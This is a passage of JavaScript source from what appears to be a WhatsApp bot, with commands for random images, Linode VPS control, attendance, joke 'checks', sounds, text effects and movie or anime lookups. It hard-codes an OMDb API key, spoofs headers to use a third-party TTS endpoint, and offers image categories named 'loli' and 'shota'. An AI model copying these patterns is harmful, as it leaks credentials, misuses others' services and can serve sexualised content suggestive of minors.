if (/ayuzawa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ayuzawa.json')
if (/boneka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boneka.json')
if (/boruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boruto.json')
if (/bts/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/bts.json')
if (/cecan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cecan.json')
if (/chiho/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chiho.json')
if (/chitoge/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chitoge.json')
if (/cogan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cogan.json')
if (/cosplay/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplay.json')
if (/cosplayloli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplayloli.json')
if (/cosplaysagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplaysagiri.json')
if (/cyber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cyber.json')
if (/deidara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/deidara.json')
if (/doraemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/doraemon.json')
if (/eba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/eba.json')
if (/elaina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/elaina.json')
if (/emilia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/emilia.json')
if (/erza/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/erza.json')
if (/exo/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/exo.json')
if (/femdom/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/femdom.json')
if (/freefire/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/freefire.json')
if (/gamewallpaper/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gamewallpaper.json')
if (/glasses/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/glasses.json')
if (/gremory/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gremory.json')
if (/hacker/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hekel.json')
if (/hestia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hestia.json')
if (/husbu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/husbu.json')
if (/inori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/inori.json')
if (/islamic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/islamic.json')
if (/isuzu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/isuzu.json')
if (/itachi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itachi.json')
if (/itori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itori.json')
if (/jennie/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jeni.json')
if (/jiso/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jiso.json')
if (/justina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/justina.json')
if (/kaga/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaga.json')
if (/kagura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kagura.json')
if (/kakasih/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kakasih.json')
if (/kaori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaori.json')
if (/cartoon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kartun.json')
if (/shortquote/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/katakata.json')
if (/keneki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/keneki.json')
if (/kotori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kotori.json')
if (/kpop/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kpop.json')
if (/kucing/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kucing.json')
if (/kurumi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kurumi.json')
if (/lisa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/lisa.json')
if (/loli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/loli.json')
if (/madara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/madara.json')
if (/megumin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/megumin.json')
if (/mikasa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikasa.json')
if (/mikey/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikey.json')
if (/miku/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/miku.json')
if (/minato/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/minato.json')
if (/mobile/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mobil.json')
if (/motor/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/motor.json')
if (/mountain/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mountain.json')
if (/naruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/naruto.json')
if (/neko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/neko.json')
if (/neko2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/neko2.json')
if (/nekonime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nekonime.json')
if (/nezuko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nezuko.json')
if (/onepiece/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/onepiece.json')
if (/pentol/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pentol.json')
if (/pokemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pokemon.json')
if (/profil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/profil.json')
if (/progamming/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/programming.json')
if (/pubg/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pubg.json')
if (/randblackpink/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randblackpink.json')
if (/randomnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime.json')
if (/randomnime2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime2.json')
if (/rize/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rize.json')
if (/rose/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rose.json')
if (/ryujin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ryujin.json')
if (/sagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sagiri.json')
if (/sakura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sakura.json')
if (/sasuke/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sasuke.json')
if (/satanic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/satanic.json')
if (/shina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shina.json')
if (/shinka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinka.json')
if (/shinomiya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinomiya.json')
if (/shizuka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shizuka.json')
if (/shota/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shota.json')
if (/space/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tatasurya.json')
if (/technology/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/technology.json')
if (/tejina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tejina.json')
if (/toukachan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/toukachan.json')
if (/tsunade/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tsunade.json')
if (/waifu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/waifu.json')
if (/wallhp/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallhp.json')
if (/wallml/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallml.json')
if (/wallmlnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallnime.json')
if (/yotsuba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yotsuba.json')
if (/yuki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yuki.json')
if (/yulibocil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yulibocil.json')
if (/yumeko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yumeko.json')
let yeha = heyy[Math.floor(Math.random() * heyy.length)]
ptz.sendMessage(m.chat, { image: { url: yeha }, caption : '`Here You Go!`' }, { quoted: m })
}
break 

        
    case 'listlinode': {
  if (!isCreator) return reply("Anda bukan pemilik.");

  try {
    const getLinodes = async () => {
      try {
        const response = await fetch('https://api.linode.com/v4/linode/instances', {
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${LINODE_API_TOKEN}`
          }
        });
        const data = await response.json();
        return data.data || [];
      } catch (error) {
        reply('Error fetching Linodes: ' + error);
        return [];
      }
    };

    getLinodes().then(linodes => {
      let totalvps = linodes.length;
      let message = `List VPS Linode Anda: ${totalvps}\n\n▬▭▬▭▬▭▬▭▬▭▬▭▬\n`;

      if (linodes.length === 0) {
        message += 'No VPS available.';
      } else {
        linodes.forEach(linode => {
          message += `- Linode Id: ${linode.id}\n- Label: ${linode.label}\n- Region: ${linode.region}\n- IP: ${linode.ipv4[0]}\n- Ram: ${linode.specs.memory / 1024} GB\n- Cpu: ${linode.specs.vcpus} CPU\n- Status: ${linode.status}\n- Harga: $\n▬▬▭▬▭▬▭▬▭▬▭▬\n`;
        });
      }
      ptz.sendMessage(m.chat, { text: message });
    });
  } catch (err) {
    reply('Happen error while taking data Linode: ' + err);
  }

  break;
}
     
        
 case "offlinode": {
  if (!isCreator) return reply(`Sok Asik Anjg`);
  
  let linodeId = args[0];
  if (!linodeId) return reply('ID Linode has not been provided yet.');

  async function turnOffLinode() {
    try {
      const response = await axios.post(
        `https://api.linode.com/v4/linode/instances/${linodeId}/shutdown`,
        {},
        {
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${LINODE_API_TOKEN}`,
          },
        }
      );

      if (response.status === 200) {
        reply('VPS (Linode) is being turned off...');
      } else {
        reply('Failed to turn off VPS (Linode).');
      }
    } catch (error) {
      reply('An error occurred while shutting down VPS (Linode):', error.message);
    }
  }

  turnOffLinode();
  break;
}

case "onlinode": {
  if (!isCreator) return reply(`Sok Asik Anjg`);
  
  let linodeId = args[0];
  if (!linodeId) return reply('ID Linode not yet given.');

  async function turnOnLinode() {
    try {
      const response = await axios.post(
        `https://api.linode.com/v4/linode/instances/${linodeId}/boot`,
        {},
        {
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${LINODE_API_TOKEN}`,
          },
        }
      );

      if (response.status === 200) {
        reply('VPS (Linode) currently activated...');
      } else {
        reply('Failed to activate VPS (Linode).');
      }
    } catch (error) {
      reply('An error occurred while activating VPS (Linode):', error.message);
    }
  }

  turnOnLinode();
  break;
}
case "rebootlinode": {
  if (!isCreator) return reply(`Pretend to be a dog`);
  
  let linodeId = args[0];
  if (!linodeId) return reply('ID Linode not yet given.');

  async function rebootLinode() {
    try {
      const response = await axios.post(
        `https://api.linode.com/v4/linode/instances/${linodeId}/reboot`,
        {},
        {
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${LINODE_API_TOKEN}`,
          },
        }
      );

      if (response.status === 200) {
        reply('VPS (Linode) currently direboot...');
      } else {
        reply('Failed me-reboot VPS (Linode).');
      }
    } catch (error) {
      reply('Happen error when me-reboot VPS (Linode):', error.message);
    }
  }

  rebootLinode();
  break;
}
    
    case 'simi':
        let chatttt = db.data.chats[m.chat];
    let argssss = m.text.split(' ');
    
            await handleSimiCommand(m, chatttt, argssss);
            break;
        
        // absen menu 
        case 'mulaiabsen': {
if (!isGroup) return reply('Only In Group')
    const chatId = m.chat; 
    const userId = m.sender;

    
    if (absenData[chatId]) {
        reply ('Absen Already dimulai di obrolan ini!');
    }

   
    absenData[chatId] = {
        admin: userId, 
        participants: [], 
    };

    
    reply('Absen Already dimulai! Use the command *.absen* untuk bergabung dalam absen ini.');
}
break;

case 'facebook11':
           case 'facebookvid': {
           if (!text)  return reply(`Silakan kirimkan tautan video Facebook\n\nCONTOH :\n*${prefix + command}* https://fb.watch/pLLTM4AFrO/?mibextid=Nif5oz`) 
     ptz.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
  try {
    const data = await fetchJson(`https://itzpire.com/download/facebook?url=${encodeURIComponent(text)}`)
    const tex = `*[ ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀᴠɪᴅ ᴄʏʀɪʟ ᴛᴇᴄʜ™ ]*`;
    const videoBuffer = data.data.video_sd;
    ptz.sendMessage(m.chat, {video: videoBuffer, caption: tex}, {quoted: m})
  } catch (error) {
    reply('Yah error kak')
  }
  }
  break 
  
case 'stupidcheck':case 'uncleancheck':
case 'hotcheck': case 'smartcheck':
case 'greatcheck':
case 'evilcheck':case 'dogcheck':
case 'coolcheck':
case 'gaycheck':
case 'waifucheck':
cantik = body.slice(1)
const okebnh1 =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const xeonkak = okebnh1[Math.floor(Math.random() * okebnh1.length)]
  let perc = `%`;
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xeonkak + perc
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: 'ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀᴠɪᴅ ᴄʏʀɪʟ ᴛᴇᴄʜ ™'
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./anitav3.jpg') }, { upload: ptz.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🧐\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '',
                  newsletterName: '',
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ptz.relayMessage(m.chat, msgs.message, {})
break


case 'absen': {
if (!isGroup) return reply('Only In Group')
    const chatId = m.chat; 
    const userId = m.sender; 

   
    if (!absenData[chatId]) {
        reply ('There isnt any proses absen yang sedang berlangsung di obrolan ini!');
    }
    absenData[chatId].participants.push(userId);

    reply('You Already Succeeded to join the attendance process!');
}
break;

case 'cekabsen': {
if (!isGroup) return reply('Only In Group')
    const chatId = m.chat;
    
    
    if (!absenData[chatId]) {
        reply ('There isnt any the ongoing absence process in this chat!!');
    }

    
    const participants = absenData[chatId].participants;

    reply(`Daftar peserta absen:\n${participants.join(', ')}`);
}
break;





case 'tts': {
  if (!text) return reply(`*Example :*\n> *.tts what is your name?*`)
  const a = await (await axios.post("https://gesserit.co/api/tiktok-tts", { text: text, voice: "id_001" }, { headers: { Referer: "https://gesserit.co/tiktok", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36" ,responseType: "arraybuffer"}})).data
  const b = Buffer.from(a.audioUrl)
  ptz.sendMessage(m.chat, { audio: Buffer.from(a.audioUrl.split("base64,")[1],"base64"), mimetype: "audio/mpeg" })
}
break 

case 'hapusabsen': {
if (!isGroup) return reply('Only In Group')
    
    const chatId = m.chat;
    if (absenData[chatId] && absenData[chatId].admin === m.sender) {
      
        delete absenData[chatId];
        
        reply('Proses absen Already deleted!');
    } else {
        reply('Anda tidak memiliki izin untuk deleting proses absen!');
    }
}
break    
        
    
     
     
     
     
     
     
     
    
        
        
        
        
        // AMPUN 
        case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
var resttt = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
 ptz.sendMessage(m.chat, { audio: resttt, mimetype: 'audio/mp4', ptt: true, 
})
break
        
        

        
        
        
        
        // poto meker
        case 'glitchtext':
case 'writetext':
case 'advancedglow':
case 'typographytext':
case 'pixelglitch':
case 'neonglitch':
case 'flagtext':
case 'flag3dtext':
case 'deletingtext':
case 'blackpinkstyle':
case 'glowingtext':
case 'underwatertext':
case 'logomaker':
case 'cartoonstyle':
case 'papercutstyle':
case 'watercolortext':
case 'effectclouds':
case 'blackpinklogo':
case 'gradienttext':
case 'summerbeach':
case 'luxurygold':
case 'multicoloredneon':
case 'sandsummer':
case 'galaxywallpaper':
case '1917style':
case 'makingneon':
case 'royaltext':
case 'freecreate':
case 'galaxystyle':
case 'lighteffects':{

if (!text) return reply(`Example : ${prefix+command} QUEEN_ANITA-V3`) 
let link
if (/glitchtext/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
if (/writetext/.test(command)) link = 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html'
if (/advancedglow/.test(command)) link = 'https://en.ephoto360.com/advanced-glow-effects-74.html'
if (/typographytext/.test(command)) link = 'https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html'
if (/pixelglitch/.test(command)) link = 'https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html'
if (/neonglitch/.test(command)) link = 'https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html'
if (/flagtext/.test(command)) link = 'https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html'
if (/flag3dtext/.test(command)) link = 'https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html'
if (/deletingtext/.test(command)) link = 'https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html'
if (/blackpinkstyle/.test(command)) link = 'https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html'
if (/glowingtext/.test(command)) link = 'https://en.ephoto360.com/create-glowing-text-effects-online-706.html'
if (/underwatertext/.test(command)) link = 'https://en.ephoto360.com/3d-underwater-text-effect-online-682.html'
if (/logomaker/.test(command)) link = 'https://en.ephoto360.com/free-bear-logo-maker-online-673.html'
if (/cartoonstyle/.test(command)) link = 'https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html'
if (/papercutstyle/.test(command)) link = 'https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html'
if (/watercolortext/.test(command)) link = 'https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html'
if (/effectclouds/.test(command)) link = 'https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html'
if (/blackpinklogo/.test(command)) link = 'https://en.ephoto360.com/create-blackpink-logo-online-free-607.html'
if (/gradienttext/.test(command)) link = 'https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html'
if (/summerbeach/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html'
if (/luxurygold/.test(command)) link = 'https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html'
if (/multicoloredneon/.test(command)) link = 'https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html'
if (/sandsummer/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html'
if (/galaxywallpaper/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html'
if (/1917style/.test(command)) link = 'https://en.ephoto360.com/1917-style-text-effect-523.html'
if (/makingneon/.test(command)) link = 'https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html'
if (/royaltext/.test(command)) link = 'https://en.ephoto360.com/royal-text-effect-online-free-471.html'
if (/freecreate/.test(command)) link = 'https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html'
if (/galaxystyle/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html'
if (/lighteffects/.test(command)) link = 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html'
let haldwhd = await ephoto(link, text)
ptz.sendMessage(m.chat, { image: { url: haldwhd }, caption: `Done` }, { quoted: m })
}
break

case 'movie':
if (!text) return reply(`_Name a Series or movie`)
await loading() 
            let fids = await axios.get(`http://www.omdbapi.com/?apikey=742b2d09&t=${text}&plot=full`)
            let imdbt = ""
            console.log(fids.data)
            imdbt += "⚍⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚍\n" + " ``` IMDB MOVIE SEARCH```\n" + "⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎\n"
            imdbt += "🎬*Title*      : " + fids.data.Title + "\n"
            imdbt += "📅*Year*       : " + fids.data.Year + "\n"
            imdbt += "⭐*Rated*      : " + fids.data.Rated + "\n"
            imdbt += "📆*Released*   : " + fids.data.Released + "\n"
            imdbt += "⏳*Runtime*    : " + fids.data.Runtime + "\n"
            imdbt += "🌀*Genre*      : " + fids.data.Genre + "\n"
            imdbt += "👨🏻‍💻*Director*   : " + fids.data.Director + "\n"
            imdbt += "✍*Writer*     : " + fids.data.Writer + "\n"
            imdbt += "👨*Actors*     : " + fids.data.Actors + "\n"
            imdbt += "📃*Plot*       : " + fids.data.Plot + "\n"
            imdbt += "🌐*Language*   : " + fids.data.Language + "\n"
            imdbt += "🌍Country    : " + fids.data.Country + "\n"
            imdbt += "🎖️Awards     : " + fids.data.Awards + "\n"
            imdbt += "📦*BoxOffice*  : " + fids.data.BoxOffice + "\n"
            imdbt += "🏙️*Production* : " + fids.data.Production + "\n"
            imdbt += "🌟*imdbRating* : " + fids.data.imdbRating + "\n"
            imdbt += "✅*imdbVotes*  : " + fids.data.imdbVotes + ""
           ptz.sendMessage(m.chat, {
image: {
url: fids.data.Poster,
},
caption: imdbt,
            }, {
quoted: m,
            })
            break
            
          case 'animesearch': {
if (!text) return reply(`What Anime Are You Looking For?`)
const malScraper = require('mal-scraper')
await loading() 
        const anime = await malScraper.getInfoFromName(text).catch(() => null)
        if (!anime) return reply(`Could not find`)
let animetxt = `
🎀 Title: ${anime.title}*
🎋 Type: ${anime.type}*
🎐 Premiered on: ${anime.premiered}*
💠 Total Episodes: ${anime.episodes}*
📈 Status: ${anime.status}*
💮 Genres: ${anime.genres}
📍 Studio: ${anime.studios}*
🌟 Score: ${anime.score}*
💎 Rating: ${anime.rating}*
🏅 Rank: ${anime.ranked}*
💫 Popularity: ${anime.popularity}*
♦️ Trailer: ${anime.trailer}*
🌐 URL: ${anime.url}*
❄ Description:* ${anime.synopsis}*`
await ptz.sendMessage(m.chat,{image:{url:anime.picture}, caption:animetxt},{quoted:m})
}
break
case 'animevideo': 
case 'amv': {
    if (!text) return reply('Enter the number, Sir\nExample: .animevideo 1')
    await loading() 
async function animeVideo() {
    const url = 'https://shortstatusvideos.com/anime-video-status-download/'; // Ganti dengan URL yang sesuai
    const response = await fetch(url);
    const html = await response.text();
    const $ = cheerio.load(html);
    const videos = [];
    $('a.mks_button.mks_button_small.squared').each((index, element) => {
        const href = $(element).attr('href');
        const title = $(element).closest('p').prevAll('p').find('strong').text();
        videos.push({
            title,
            source: href
        });
    });

    const randomIndex = Math.floor(Math.random() * videos.length);
    const randomVideo = videos[randomIndex];

    return randomVideo;
}

async function animeVideo2() {
    const url = 'https://mobstatus.com/anime-whatsapp-status-video/'; // Ganti dengan URL yang sesuai
    const response = await fetch(url);
    const html = await response.text();
    const $ = cheerio.load(html);

    const videos = [];

    const title = $('strong').text();

